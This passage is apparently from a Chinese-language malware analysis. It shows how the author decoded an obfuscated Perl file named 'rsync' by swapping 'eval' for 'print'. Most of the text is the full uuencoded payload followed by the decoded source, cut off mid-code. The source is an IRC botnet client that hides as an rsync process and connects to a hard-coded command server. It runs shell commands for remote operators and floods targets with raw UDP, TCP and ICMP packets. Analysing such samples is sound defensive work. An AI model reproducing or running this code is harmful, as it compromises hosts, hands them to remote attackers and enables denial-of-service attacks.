*(\"`@?0H@(\"!E;'-I9B`H)&-A<V4@/7X@+UYN;W9O;FEC:R\\I('L*(\"`@(&UY_(\"1N;W9O;FEC:R`](&=E=&YI8VLH*3L*(\"`@(\"!N:6-K*\"(D;F]V;VYI8VLB*3L*(\"`@?0H@(\"!E;'-I9B`H_)&-A<V4@/7X@+UYE<W1A=&ES=&EC87,@*\"XJ*2\\I('L*(\"`@(\"!I9B`H)#$@97$@(F]N(BD@>PH@(\"`@(\"`D_97-T871I<W1I8V%S(#T@,3L*(\"`@(\"`@;7-G*\"(D<')I;G1L(BP@(D5S=&%T+G-T:6-A<R!A=&EV861A<R$B_*3L*(\"`@(\"!](&5L<VEF(\"@D,2!E<2`B;V9F(BD@>PH@(\"`@(\"`D97-T871I<W1I8V%S(#T@,#L*(\"`@(\"`@_;7-G*\"(D<')I;G1L(BP@(D5S=&%T+G-T:6-A<R!D97-A=&EV861A<R$B*3L*(\"`@(\"!]\"B`@('T*(\"`@96QS_:68@*\"1C87-E(#U^(\"]><&%C;W1E<R`H+BHI+RD@>PH@(\"`@(&EF(\"@D,2!E<2`B;VXB*2![\"B`@(\"`@(\"1P_86-O=&5S(#T@,3L*(\"`@(\"`@;7-G*\"(D<')I;G1L(BP@(E!A8V]T97,@871I=F%D;W,A(BD@:68@*\"1E<W1A_=&ES=&EC87,@/3T@(C$B*3L*(\"`@(\"!](&5L<VEF(\"@D,2!E<2`B;V9F(BD@>PH@(\"`@(\"`D<&%C;W1E<R`]_(#`[\"B`@(\"`@(&US9R@B)'!R:6YT;\"(L(\")086-O=&5S(&1E<V%T:79A9&]S(2(I(&EF(\"@D97-T871I<W1I_8V%S(#T](\"(Q(BD[\"B`@(\"`@?0H@(\"!]\"GT*<W5B('-H96QL('L*(\"!R971U<FX@=6YL97-S(\"1A8V5S<V]S_:&5L;#L*(\"!M>2`D<')I;G1L/21?6S!=.PH@(&UY(\"1C;VUA;F1O/21?6S%=.PH@(&EF(\"@D8V]M86YD;R`]_?B`O8V0@*\"XJ*2\\I('L*(\"`@(&-H9&ER*\"(D,2(I('Q\\(&US9R@B)'!R:6YT;\"(L(\")$:7)E=\"YR:6\\@:6YE_>&ES=&5N=&4A(BD[\"B`@(\"!R971U<FX[\"B`@?0H@(&5L<VEF(\"@D<&ED(#T@9F]R:RD@>PH@(\"`@('=A:71P_:60H)'!I9\"P@,\"D[\"B`@?2!E;'-E('L*(\"`@(\"`@:68@*&9O<FLI('L*(\"`@(\"`@(\"`@97AI=#L*(\"`@(\"`@_('T@96QS92![\"B`@(\"`@(\"`@(\"`@;7D@0')E<W`]8\"1C;VUA;F1O(#(^)C$@,SXF,6`[\"B`@(\"`@(\"`@(\"`@_;7D@)&,],#L*(\"`@(\"`@(\"`@(\"!F;W)E86-H(&UY(\"1L:6YH82`H0')E<W`I('L*(\"`@(\"`@(\"`@(\"`@(\"1C_*RL[\"B`@(\"`@(\"`@(\"`@(\"!C:&]P(\"1L:6YH83L*(\"`@(\"`@(\"`@(\"`@('-E;F1R87<H)$E20U]C=7)?<V]C_:V5T+\"`B4%))5DU31R`D<')I;G1L(#HD;&EN:&$B*3L*(\"`@(\"`@(\"`@(\"`@(&EF(\"@D8R`^/2`B)&QI;F%S_7VUA>\"(I('L*(\"`@(\"`@(\"`@(\"`@(\"`@)&,],#L*(\"`@(\"`@(\"`@(\"`@(\"`@<VQE97`@)'-L965P.PH@(\"`@_(\"`@(\"`@(\"`@?0H@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"!E>&ET.PH@(\"`@(\"`@?0H@('T*?0H*<W5B(&%T_=&%C:V5R('L*(\"!M>2`D:6%D9'(@/2!I;F5T7V%T;VXH)%];,%TI.PH@(&UY(\"1M<V<@/2`G0B<@>\"`D7ULQ_73L*(\"!M>2`D9G1I;64@/2`D7ULR73L*(\"!M>2`D8W`@/2`P.PH@(&UY(\"@E<&%C;W1E<RD[\"B`@)'!A8V]T_97-[:6-M<'T@/2`D<&%C;W1E<WMI9VUP?2`](\"1P86-O=&5S>W5D<'T@/2`D<&%C;W1E<WMO?2`](\"1P86-O_=&5S>W1C<'T@/2`P.PH*(\"!S;V-K970H4T]#2S$L(%!&7TE.150L(%-/0TM?4D%7+\"`R*2!O<B`D8W`K*SL*_(\"!S;V-K970H4T]#2S(L(%!&7TE.150L(%-/0TM?1$=204TL(#$W*2!O<B`D8W`K*SL*(\"!S;V-K970H4T]#_2S,L(%!&7TE.150L(%-/0TM?4D%7+\"`Q*2!O<B`D8W`K*SL*(\"!S;V-K970H4T]#2S0L(%!&7TE.150L(%-/_0TM?4D%7+\"`V*2!O<B`D8W`K*SL*(\"!R971U<FXH=6YD968I(&EF(\"1C<\"`]/2`T.PH@(&UY(\"1I=&EM92`]_('1I;64[\"B`@;7D@*\"1C=7)?=&EM92D[\"B`@=VAI;&4@*\"`Q(\"D@>PH@(\"`@(&9O<B`H;7D@)'!O<G1A(#T@_,3L@)'!O<G1A(#P](#8U-3,U.R`D<&]R=&$K*RD@>PH@(\"`@(\"`@)&-U<E]T:6UE(#T@=&EM92`M(\"1I=&EM_93L*(\"`@(\"`@(&QA<W0@:68@)&-U<E]T:6UE(#X](\"1F=&EM93L*(\"`@(\"`@('-E;F0H4T]#2S$L(\"1M<V<L_(#`L('-O8VMA9&1R7VEN*\"1P;W)T82P@)&EA9&1R*2D@86YD(\"1P86-O=&5S>VEG;7!]*RL@:68@*\"1P86-O_=&5S(#T](#$I.PH@(\"`@(\"`@<V5N9\"A33T-+,BP@)&US9RP@,\"P@<V]C:V%D9')?:6XH)'!O<G1A+\"`D:6%D_9'(I*2!A;F0@)'!A8V]T97-[=61P?2LK(&EF(\"@D<&%C;W1E<R`]/2`Q*3L*(\"`@(\"`@('-E;F0H4T]#2S,L_(\"1M<V<L(#`L('-O8VMA9&1R7VEN*\"1P;W)T82P@)&EA9&1R*2D@86YD(\"1P86-O=&5S>VEC;7!]*RL@:68@_*\"1P86-O=&5S(#T](#$I.PH@(\"`@(\"`@<V5N9\"A33T-+-\"P@)&US9RP@,\"P@<V]C:V%D9')?:6XH)'!O<G1A_+\"`D:6%D9'(I*2!A;F0@)'!A8V]T97-[=&-P?2LK(&EF(\"@D<&%C;W1E<R`]/2`Q*3L*\"B`@(\"`@(\"!F;W(@_*&UY(\"1P8R`](#,[(\"1P8R`\\/2`R-34[)'!C*RLI('L*(\"`@(\"`@(\"`@;F5X=\"!I9B`D<&,@/3T@-CL*(\"`@_(\"`@(\"`@)&-U<E]T:6UE(#T@=&EM92`M(\"1I=&EM93L*(\"`@(\"`@(\"`@;&%S=\"!I9B`D8W5R7W1I;64@/CT@_)&9T:6UE.PH@(\"`@(\"`@(\"!S;V-K970H4T]#2S4L(%!&7TE.150L(%-/0TM?4D%7+\"`D<&,I(&]R(&YE>'0[_\"B`@(\"`@(\"`@('-E;F0H4T]#2S4L(\"1M<V<L(#`L('-O8VMA9&1R7VEN*\"1P;W)T82P@)&EA9&1R*2D@86YD_(\"1P86-O=&5S>V]]*RL@:68@*\"1P86-O=&5S(#T](#$I.PH@(\"`@(\"`@?0H@(\"`@('T*(\"`@(\"!L87-T(&EF_(\"1C=7)?=&EM92`^/2`D9G1I;64[\"B`@?0H@(')E='5R;B@D8W5R7W1I;64L(\"5P86-O=&5S*3L*?0H*\"G-U_8B!A8W1I;VX@>PH@(\"!R971U<FX@=6YL97-S(\"0C7R`]/2`Q.PH@(\"!S96YD<F%W*\")04DE635-'(\"1?6S!=_(#I<,#`Q04-424].(\"1?6S%=7#`P,2(I.PI]\"@IS=6(@8W1C<\"![\"B`@(')E='5R;B!U;FQE<W,@)\"-?(#T]_(#$[\"B`@('-E;F1R87<H(E!2259-4T<@)%];,%T@.EPP,#$D7ULQ75PP,#$B*3L*?0IS=6(@;7-G('L*(\"`@_<F5T=7)N('5N;&5S<R`D(U\\@/3T@,3L*(\"`@<V5N9')A=R@B4%))5DU31R`D7ULP72`Z)%];,5TB*3L*?0H*_<W5B(&YO=&EC92![\"B`@(')E='5R;B!U;FQE<W,@)\"-?(#T](#$[\"B`@('-E;F1R87<H(DY/5$E#12`D7ULP_72`Z)%];,5TB*3L*?0H*<W5B(&]P('L*(\"`@<F5T=7)N('5N;&5S<R`D(U\\@/3T@,3L*(\"`@<V5N9')A=R@B_34]$12`D7ULP72`K;R`D7ULQ72(I.PI]\"G-U8B!D96]P('L*(\"`@<F5T=7)N('5N;&5S<R`D(U\\@/3T@,3L*_(\"`@<V5N9')A=R@B34]$12`D7ULP72`M;R`D7ULQ72(I.PI]\"G-U8B!H;W`@>PH@(\"`@<F5T=7)N('5N;&5S_<R`D(U\\@/3T@,3L*(\"`@<V5N9')A=R@B34]$12`D7ULP72`K:\"`D7ULQ72(I.PI]\"G-U8B!D96AO<\"![\"B`@_(')E='5R;B!U;FQE<W,@)\"-?(#T](#$[\"B`@('-E;F1R87<H(DU/1$4@)%];,%T@*V@@)%];,5TB*3L*?0IS_=6(@=F]I8V4@>PH@(\"!R971U<FX@=6YL97-S(\"0C7R`]/2`Q.PH@(\"!S96YD<F%W*\")-3T1%(\"1?6S!=(\"MV_(\"1?6S%=(BD[\"GT*<W5B(&1E=F]I8V4@>PH@(\"!R971U<FX@=6YL97-S(\"0C7R`]/2`Q.PH@(\"!S96YD<F%W_*\")-3T1%(\"1?6S!=(\"UV(\"1?6S%=(BD[\"GT*<W5B(&)A;B![\"B`@(')E='5R;B!U;FQE<W,@)\"-?(#T](#$[_\"B`@('-E;F1R87<H(DU/1$4@)%];,%T@*V(@)%];,5TB*3L*?0IS=6(@=6YB86X@>PH@(\"!R971U<FX@=6YL_97-S(\"0C7R`]/2`Q.PH@(\"!S96YD<F%W*\")-3T1%(\"1?6S!=(\"UB(\"1?6S%=(BD[\"GT*<W5B(&MI8VL@>PH@_(\"!R971U<FX@=6YL97-S(\"0C7R`]/2`Q.PH@(\"!S96YD<F%W*\")+24-+(\"1?6S!=(\"1?6S%=(#HD7ULR72(I_.PI]\"@IS=6(@;6]D;R![\"B`@(')E='5R;B!U;FQE<W,@)\"-?(#T](#`[\"B`@('-E;F1R87<H(DU/1$4@)%];_,%T@)%];,5TB*3L*?0IS=6(@;6]D92![(&UO9&\\H0%\\I.R!]\"@IS=6(@:B![(\"9J;VEN*$!?*3L@?0IS=6(@_:F]I;B![\"B`@(')E='5R;B!U;FQE<W,@)\"-?(#T](#`[\"B`@('-E;F1R87<H(DI/24X@)%];,%TB*3L*?0IS_=6(@<\"![('!A<G0H0%\\I.R!]\"G-U8B!P87)T('MS96YD<F%W*\")005)4(\"1?6S!=(BD[?0H*<W5B(&YI8VL@_>PH@(')E='5R;B!U;FQE<W,@)\"-?(#T](#`[\"B`@<V5N9')A=R@B3DE#2R`D7ULP72(I.PI]\"@IS=6(@:6YV_:71E('L*(\"`@<F5T=7)N('5N;&5S<R`D(U\\@/3T@,3L*(\"`@<V5N9')A=R@B24Y6251%(\"1?6S%=(\"1?6S!=_(BD[\"GT*<W5B('1O<&EC;R![\"B`@(')E='5R;B!U;FQE<W,@)\"-?(#T](#$[\"B`@('-E;F1R87<H(E1/4$E#_(\"1?6S!=(\"1?6S%=(BD[\"GT*<W5B('1O<&EC('L@=&]P:6-O*$!?*3L@?0H*<W5B('=H;VES('L*(\"!R971U_<FX@=6YL97-S(\"0C7R`]/2`P.PH@('-E;F1R87<H(E=(3TE3(\"1?6S!=(BD[\"GT*<W5B('=H;R![\"B`@<F5T_=7)N('5N;&5S<R`D(U\\@/3T@,#L*(\"!S96YD<F%W*\")72$\\@)%];,%TB*3L*?0IS=6(@;F%M97,@>PH@(')E_='5R;B!U;FQE<W,@)\"-?(#T](#`[\"B`@<V5N9')A=R@B3D%-15,@)%];,%TB*3L*?0IS=6(@87=A>2![\"B`@_<V5N9')A=R@B05=!62`D7ULP72(I.PI]\"G-U8B!B86-K('L@87=A>2@I.R!]\"G-U8B!Q=6ET('L*(\"!S96YD_<F%W*\")154E4(#HD7ULP72(I.PH@(&5X:70[\"GT*\"G!A8VMA9V4@1$-#.PH*<W5B(&-O;FYE8W1I;VYS('L*_(\"`@;7D@0')E861Y(#T@)&1C8U]S96PM/F-A;E]R96%D*#$I.PH@(\"!F;W)E86-H(&UY(\"1F:\"`H0')E861Y_*2![\"B`@(\"`@;7D@)&1C8W1I<&\\@/2`D1$-#>R1F:'U[=&EP;WT[\"B`@(\"`@;7D@)&%R<75I=F\\@/2`D1$-#_>R1F:'U[87)Q=6EV;WT[\"B`@(\"`@;7D@)&)Y=&5S(#T@)$1#0WLD9FA]>V)Y=&5S?3L*(\"`@(\"!M>2`D8W5R_7V)Y=&4@/2`D1$-#>R1F:'U[8W5R8GET97T[\"B`@(\"`@;7D@)&YI8VL@/2`D1$-#>R1F:'U[;FEC:WT[\"@H@_(\"`@(&UY(\"1M<V<[\"B`@(\"`@;7D@)&YR96%D(#T@<WES<F5A9\"@D9F@L(\"1M<V<L(#$P,C0P*3L*\"B`@(\"`@_:68@*\"1N<F5A9\"`]/2`P(&%N9\"`D9&-C=&EP;R`]?B`O7BAG971\\<V5N9&-O;BDD+RD@>PH@(\"`@(\"`@(\"1$_0T-[)&9H?7MS=&%T=7-](#T@(D-A;F-E;&%D;R([\"B`@(\"`@(\"`@)$1#0WLD9FA]>V9T:6UE?2`]('1I;64[_\"B`@(\"`@(\"`@)&1C8U]S96PM/G)E;6]V92@D9F@I.PH@(\"`@(\"`@(\"1F:\"T^8VQO<V4[\"B`@(\"`@(\"`@;F5X_=#L*(\"`@(\"!]\"@H@(\"`@(&EF(\"@D9&-C=&EP;R!E<2`B9V5T(BD@>PH@(\"`@(\"`@(\"1$0T-[)&9H?7MC=7)B_>71E?2`K/2!L96YG=&@H)&US9RD[\"@H@(\"`@(\"`@(&UY(\"1C=7)?8GET92`](\"1$0T-[)&9H?7MC=7)B>71E_?3L*\"B`@(\"`@(\"`@;W!E;BA&24Q%+\"`B/CX@)&%R<75I=F\\B*3L*(\"`@(\"`@(\"!P<FEN=\"!&24Q%(\"(D;7-G_(B!I9B`H)&-U<E]B>71E(#P](\"1B>71E<RD[\"B`@(\"`@(\"`@8VQO<V4H1DE,12D[\"@H@(\"`@(\"`@(&UY(\"1P_86-K8GET92`]('!A8VLH(DXB+\"`D8W5R7V)Y=&4I.PH@(\"`@(\"`@('!R:6YT(\"1F:\"`B)'!A8VMB>71E(CL*_\"B`@(\"`@(\"`@:68@*\"1B>71E<R`]/2`D8W5R7V)Y=&4I('L*(\"`@(\"`@(\"`@(\"`D9&-C7W-E;\"T^<F5M;W9E_*\"1F:\"D[\"B`@(\"`@(\"`@(\"`@)&9H+3YC;&]S93L*(\"`@(\"`@(\"`@(\"`D1$-#>R1F:'U[<W1A='5S?2`](\")2_96-E8FED;R([\"B`@(\"`@(\"`@(\"`@)$1#0WLD9FA]>V9T:6UE?2`]('1I;64[\"B`@(\"`@(\"`@(\"`@;F5X=#L*_(\"`@(\"`@(\"!]\"B`@(\"`@?2!E;'-I9B`H)&1C8W1I<&\\@97$@(G-E;F0B*2![\"B`@(\"`@(\"`@(\"!M>2`D<V5N_9\"`](\"1F:\"T^86-C97!T.PH@(\"`@(\"`@(\"`@)'-E;F0M/F%U=&]F;'5S:\"@Q*3L*(\"`@(\"`@(\"`@(\"1D8V-?_<V5L+3YA9&0H)'-E;F0I.PH@(\"`@(\"`@(\"`@)&1C8U]S96PM/G)E;6]V92@D9F@I.PH@(\"`@(\"`@(\"`@)$1#_0WLD<V5N9'U[=&EP;WT@/2`G<V5N9&-O;B<[\"B`@(\"`@(\"`@(\"`D1$-#>R1S96YD?7MI=&EM97T@/2!T:6UE_.PH@(\"`@(\"`@(\"`@)$1#0WLD<V5N9'U[;FEC:WT@/2`D;FEC:SL*(\"`@(\"`@(\"`@(\"1$0T-[)'-E;F1]>V)Y_=&5S?2`](\"1B>71E<SL*(\"`@(\"`@(\"`@(\"1$0T-[)'-E;F1]>V-U<F)Y=&5](#T@,#L*(\"`@(\"`@(\"`@(\"1$_0T-[)'-E;F1]>V%R<75I=F]](#T@)&%R<75I=F\\[\"B`@(\"`@(\"`@(\"`D1$-#>R1S96YD?7MI<'T@/2`D<V5N_9\"T^<&5E<FAO<W0[\"B`@(\"`@(\"`@(\"`D1$-#>R1S96YD?7MP;W)T87T@/2`D<V5N9\"T^<&5E<G!O<G0[\"B`@_(\"`@(\"`@(\"`D1$-#>R1S96YD?7MS=&%T=7-](#T@(D5N=FEA;F1O(CL*\"B`@(\"`@(\"`@(\"!O<&5N*$9)3$4L_(\"(\\(\"1A<G%U:79O(BD[\"B`@(\"`@(\"`@(\"!M>2`D9F)Y=&5S.PH@(\"`@(\"`@(\"`@<F5A9\"A&24Q%+\"`D9F)Y_=&5S+\"`Q,#(T*3L*(\"`@(\"`@(\"`@('!R:6YT(\"1S96YD(\"(D9F)Y=&5S(CL*(\"`@(\"`@(\"`@(&-L;W-E($9)_3$4[\"B`@(\"`@?2!E;'-I9B`H)&1C8W1I<&\\@97$@)W-E;F1C;VXG*2![\"B`@(\"`@(\"`@(\"!M>2`D8GET97-?_<V5N9&5D(#T@=6YP86-K*\").(BP@)&US9RD[\"B`@(\"`@(\"`@(\"`D1$-#>R1F:'U[8W5R8GET97T@/2`D8GET_97-?<V5N9&5D.PH@(\"`@(\"`@(\"`@:68@*\"1B>71E<U]S96YD960@/3T@)&)Y=&5S*2![\"B`@(\"`@(\"`@(\"`@_(\"`D9F@M/F-L;W-E.PH@(\"`@(\"`@(\"`@(\"`@)&1C8U]S96PM/G)E;6]V92@D9F@I.PH@(\"`@(\"`@(\"`@(\"`@_)$1#0WLD9FA]>W-T871U<WT@/2`B16YV:6%D;R([\"B`@(\"`@(\"`@(\"`@(\"`D1$-#>R1F:'U[9G1I;65](#T@_=&EM93L*(\"`@(\"`@(\"`@(\"`@(&YE>'0[\"B`@(\"`@(\"`@(\"!]\"B`@(\"`@(\"`@(\"!O<&5N*%-%3D1&24Q%+\"`B_/\"`D87)Q=6EV;R(I.PH@(\"`@(\"`@(\"`@<V5E:RA314Y$1DE,12P@)&)Y=&5S7W-E;F1E9\"P@,\"D[\"B`@(\"`@_(\"`@(\"!M>2`D<V5N9%]B>71E<SL*(\"`@(\"`@(\"`@(')E860H4T5.1$9)3$4L(\"1S96YD7V)Y=&5S+\"`Q,#(T_*3L*(\"`@(\"`@(\"`@('!R:6YT(\"1F:\"`B)'-E;F1?8GET97,B.PH@(\"`@(\"`@(\"`@8VQO<V4H4T5.1$9)3$4I_.PH@(\"`@('T*(\"`@?0I]\"@H*<W5B(%-%3D0@>PH@(&UY(\"@D;FEC:RP@)&%R<75I=F\\I(#T@0%\\[\"B`@=6YL_97-S(\"@M<B`B)&%R<75I=F\\B*2![\"B`@(\"!R971U<FXH,\"D[\"B`@?0H*(\"!M>2`D9&-C87)K(#T@)&%R<75I_=F\\[\"B`@)&1C8V%R:R`]?B!S+ULN*EPO72A<4RLI+R0Q+SL*\"B`@;7D@)&UE=6EP(#T@)#HZ:7)C7W-E<G9E_<G-[(B0Z.DE20U]C=7)?<V]C:V5T(GU[)VUE=6EP)WT[\"B`@;7D@)&QO;F=I<\"`]('5N<&%C:R@B3B(L:6YE_=%]A=&]N*\"1M975I<\"DI.PH*(\"!M>2!`9FEL97-T870@/2!S=&%T*\"1A<G%U:79O*3L*(\"!M>2`D<VEZ95]T_;W1A;#TD9FEL97-T871;-UT[\"B`@:68@*\"1S:7IE7W1O=&%L(#T](#`I('L*(\"`@(\"!R971U<FXH,\"D[\"B`@_?0H*(\"!M>2`H)'!O<G1A+\"`D<V5N9'-O8VLI.PH@(&1O('L*(\"`@(\"1P;W)T82`](&EN=\"!R86YD*#8T-3$Q_*3L*(\"`@(\"1P;W)T82`K/2`Q,#(T.PH@(\"`@)'-E;F1S;V-K(#T@24\\Z.E-O8VME=#HZ24Y%5\"T^;F5W*$QI_<W1E;CT^,2P@3&]C86Q0;W)T(#T^)'!O<G1A+\"!0<F]T;R`]/B`G=&-P)RD@86YD(\"1D8V-?<V5L+3YA9&0H_)'-E;F1S;V-K*3L*(\"!]('5N=&EL(\"1S96YD<V]C:SL*\"B`@)$1#0WLD<V5N9'-O8VM]>W1I<&]](#T@)W-E_;F0G.PH@(\"1$0T-[)'-E;F1S;V-K?7MN:6-K?2`](\"1N:6-K.PH@(\"1$0T-[)'-E;F1S;V-K?7MB>71E<WT@_/2`D<VEZ95]T;W1A;#L*(\"`D1$-#>R1S96YD<V]C:WU[87)Q=6EV;WT@/2`D87)Q=6EV;SL*\"@H@(\"8Z.F-T_8W`H(B1N:6-K(BP@(D1#0R!314Y$(\"1D8V-A<FL@)&QO;F=I<\"`D<&]R=&$@)'-I>F5?=&]T86PB*3L*\"GT*_\"G-U8B!'150@>PH@(&UY(\"@D87)Q=6EV;RP@)&1C8VQO;F=I<\"P@)&1C8W!O<G1A+\"`D8GET97,L(\"1N:6-K_*2`]($!?.PH@(')E='5R;B@P*2!I9B`H+64@(B1A<G%U:79O(BD[\"B`@:68@*&]P96XH1DE,12P@(CX@)&%R_<75I=F\\B*2D@>PH@(\"`@(&-L;W-E($9)3$4[\"B`@?2!E;'-E('L*(\"`@(')E='5R;B@P*3L*(\"!]\"@H@(&UY_(\"1D8V-I<#UF:7AA9&1R*\"1D8V-L;VYG:7`I.PH@(')E='5R;B@P*2!I9B`H)&1C8W!O<G1A(#P@,3`R-\"!O_<B!N;W0@9&5F:6YE9\"`D9&-C:7`@;W(@)&)Y=&5S(#P@,2D[\"B`@;7D@)&1C8W-O8VL@/2!)3SHZ4V]C:V5T_.CI)3D54+3YN97<H4')O=&\\]/B)T8W`B+\"!0965R061D<CT^)&1C8VEP+\"!0965R4&]R=#T^)&1C8W!O<G1A_+\"!4:6UE;W5T/3XQ-2D@;W(@<F5T=7)N(\"@P*3L*(\"`D9&-C<V]C:RT^875T;V9L=7-H*#$I.PH@(\"1D8V-?_<V5L+3YA9&0H)&1C8W-O8VLI.PH@(\"1$0T-[)&1C8W-O8VM]>W1I<&]](#T@)V=E=\"<[\"B`@)$1#0WLD9&-C_<V]C:WU[:71I;65](#T@=&EM93L*(\"`D1$-#>R1D8V-S;V-K?7MN:6-K?2`](\"1N:6-K.PH@(\"1$0T-[)&1C_8W-O8VM]>V)Y=&5S?2`](\"1B>71E<SL*(\"`D1$-#>R1D8V-S;V-K?7MC=7)B>71E?2`](#`[\"B`@)$1#0WLD_9&-C<V]C:WU[87)Q=6EV;WT@/2`D87)Q=6EV;SL*(\"`D1$-#>R1D8V-S;V-K?7MI<'T@/2`D9&-C:7`[\"B`@_)$1#0WLD9&-C<V]C:WU[<&]R=&%](#T@)&1C8W!O<G1A.PH@(\"1$0T-[)&1C8W-O8VM]>W-T871U<WT@/2`B_4F5C96)E;F1O(CL*?0H*<W5B(%-T871U<R![\"B`@;7D@)'-O8VME=\"`]('-H:69T.PH@(&UY(\"1S;V-K7W1I_<&\\@/2`D1$-#>R1S;V-K971]>W1I<&]].PH@('5N;&5S<R`H;&,H)'-O8VM?=&EP;RD@97$@(F-H870B*2![_\"B`@(\"!M>2`D;FEC:R`](\"1$0T-[)'-O8VME='U[;FEC:WT[\"B`@(\"!M>2`D87)Q=6EV;R`](\"1$0T-[)'-O_8VME='U[87)Q=6EV;WT[\"B`@(\"!M>2`D:71I;64@/2`D1$-#>R1S;V-K971]>VET:6UE?3L*(\"`@(&UY(\"1F_=&EM92`]('1I;64[\"B`@(\"!M>2`D<W1A='5S(#T@)$1#0WLD<V]C:V5T?7MS=&%T=7-].PH@(\"`@)&9T:6UE_(#T@)$1#0WLD<V]C:V5T?7MF=&EM97T@:68@9&5F:6YE9\"@D1$-#>R1S;V-K971]>V9T:6UE?2D[\"@H@(\"`@_;7D@)&1?=&EM92`](\"1F=&EM92TD:71I;64[\"@H@(\"`@;7D@)&-U<E]B>71E(#T@)$1#0WLD<V]C:V5T?7MC_=7)B>71E?3L*(\"`@(&UY(\"1B>71E<U]T;W1A;\"`](\"`D1$-#>R1S;V-K971]>V)Y=&5S?3L*\"B`@(\"!M>2`D_<F%T92`](#`[\"B`@(\"`D<F%T92`](\"@D8W5R7V)Y=&4O,3`R-\"DO)&1?=&EM92!I9B`D8W5R7V)Y=&4@/B`P_.PH@(\"`@;7D@)'!O<F-E;B`](\"@D8W5R7V)Y=&4J,3`P*2\\D8GET97-?=&]T86P[\"@H@(\"`@;7D@*\"1R7V1U_=BP@)'!?9'5V*3L*(\"`@(&EF(\"@D<F%T92`]?B`O7BA<9\"LI7\"XH7&0I*%QD*2A<9\"DO*2![\"B`@(\"`@(\"`D_<E]D=78@/2`D,SL@)')?9'5V*RL@:68@)#0@/CT@-3L*(\"`@(\"`@(\"1R871E(#T@(B0Q7\"XD,B(N(B1R7V1U_=B([\"B`@(\"!]\"B`@(\"!I9B`H)'!O<F-E;B`]?B`O7BA<9\"LI7\"XH7&0I*%QD*2A<9\"DO*2![\"B`@(\"`@(\"`D_<%]D=78@/2`D,SL@)'!?9'5V*RL@:68@)#0@/CT@-3L*(\"`@(\"`@(\"1P;W)C96X@/2`B)#%<+B0R(BXB)'!?_9'5V(CL*(\"`@('T*(\"`@(')E='5R;B@B)'-O8VM?=&EP;R(L(B1S=&%T=7,B+\"(D;FEC:R(L(B1A<G%U:79O_(BPB)&)Y=&5S7W1O=&%L(BP@(B1C=7)?8GET92(L(B1D7W1I;64B+\"`B)')A=&4B+\"`B)'!O<F-E;B(I.PH@_('T*\"@H@(')E='5R;B@P*3L*?0H*\"G-U8B!F:7AA9&1R('L*(\"`@(&UY(\"@D861D<F5S<RD@/2!`7SL*\"B`@_(\"!C:&]M<\"`D861D<F5S<SL@(\"`@(`H@(\"`@:68@*\"1A9&1R97-S(#U^(\"]>7&0K)\"\\I('L*(\"`@(\"`@(\"!R_971U<FX@:6YE=%]N=&]A*'!A8VL@(DXB+\"`D861D<F5S<RD[\"B`@(\"!](&5L<VEF(\"@D861D<F5S<R`]?B`O_7ELQ,ET_7&1[,2PR?5PN6S$R73]<9'LQ+#)]7\"Y;,3)=/UQD>S$L,GU<+ELQ,ET_7&1[,2PR?20O*2![\"B`@_(\"`@(\"`@<F5T=7)N(\"1A9&1R97-S.PH@(\"`@?2!E;'-I9B`H)&%D9')E<W,@/7X@='(O82UZ02U:+R\\I('L@_(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(`H@(\"`@(\"`@(')E='5R;B!I;F5T7VYT;V$H*\"AG971H;W-T8GEN86UE*\"1AV9&1R97-S*2E;-%TI6S!=*3L*(\"`@('T@96QS92![\"B`@(\"`@(\"`@<F5T=7)N.PH@(\"`@?0I]}\n```\n\n使用了 `eval unpack` 看起來是需要解密的東西\n\n\n\n發現 perl 有一個函數為 `unpack()`\n\n所以我們將 開頭的 `eval` 掉換成 `print`\n\n在使用 perl 執行\n\n```bash=\n$ perl rsync\n```\n\n順利把程式碼解出來了\n\n```perl\n\nmy $processo = 'rsync';\n\n$servidor='5.255.86.129' unless $servidor;\nmy $porta='443';\nmy @canais=(\"#007\");\nmy @adms=(\"A\",\"X\");\nmy @auth=(\"localhost\");\n\nmy $linas_max=6;\nmy $sleep=3;\n\nmy $nick = getnick();\nmy $ircname = getnick();\nmy $realname = (`uname -a`);\n\nmy $acessoshell = 1;\nmy $prefixo = \"! \";\nmy $estatisticas = 0;\nmy $pacotes = 1;\n\nmy $VERSAO = '0.2a';\n\n$SIG{'INT'} = 'IGNORE';\n$SIG{'HUP'} = 'IGNORE';\n$SIG{'TERM'} = 'IGNORE';\n$SIG{'CHLD'} = 'IGNORE';\n$SIG{'PS'} = 'IGNORE';\n\nuse IO::Socket;\nuse Socket;\nuse IO::Select;\nchdir(\"/\");\n$servidor=\"$ARGV[0]\" if $ARGV[0];\n$0=\"$processo\".\"\\0\";\nmy $pid=fork;\nexit if $pid;\ndie \"Problema com o fork: $!\" unless defined($pid);\n\nmy %irc_servers;\nmy %DCC;\nmy $dcc_sel = new IO::Select->new();\n\n\n\n\nsub getnick {\n  return \"x\".int(rand(9000));\n}\n\n\nsub getident {\n  my $retornoident = &_get(\"http://www.minpop.com/sk12pack/idents.php\");\n  my $identchance = int(rand(1000));\n  if ($identchance > 30) {\n     return $nick;\n  } else {\n     return $retornoident;\n  }\n  return $retornoident;\n}\n\nsub getname {\n  my $retornoname = &_get(\"http://www.minpop.com/sk12pack/names.php\");\n  return $retornoname;\n}\n\nsub getident2 {\n        my $length=shift;\n        $length = 3 if ($length < 3);\n\n        my @chars=('a'..'z','A'..'Z','1'..'9');\n        foreach (1..$length)\n        {\n                $randomstring.=$chars[rand @chars];\n        }\n        return $randomstring;\n}\n\nsub getstore ($$)\n{\n  my $url = shift;\n  my $file = shift;\n\n  $http_stream_out = 1;\n  open(GET_OUTFILE, \"> $file\");\n  %http_loop_check = ();\n  _get($url);\n  close GET_OUTFILE;\n  return $main::http_get_result;\n}\n\nsub _get\n{\n  my $url = shift;\n  my $proxy = \"\";\n  grep {(lc($_) eq \"http_proxy\") && ($proxy = $ENV{$_})} keys %ENV;\n  if (($proxy eq \"\") && $url =~ m,^http://([^/:]+)(?::(\\d+))?(/\\S*)?$,) {\n    my $host = $1;\n    my $port = $2 || 80;\n    my $path = $3;\n    $path = \"/\" unless defined($path);\n    return _trivial_http_get($host, $port, $path);\n  } elsif ($proxy =~ m,^http://([^/:]+):(\\d+)(/\\S*)?$,) {\n    my $host = $1;\n    my $port = $2;\n    my $path = $url;\n    return _trivial_http_get($host, $port, $path);\n  } else {\n    return undef;\n  }\n}\n\n\nsub _trivial_http_get\n{\n  my($host, $port, $path) = @_;\n  my($AGENT, $VERSION, $p);\n\n  $AGENT = \"get-minimal\";\n  $VERSION = \"20000118\";\n\n  $path =~ s/ 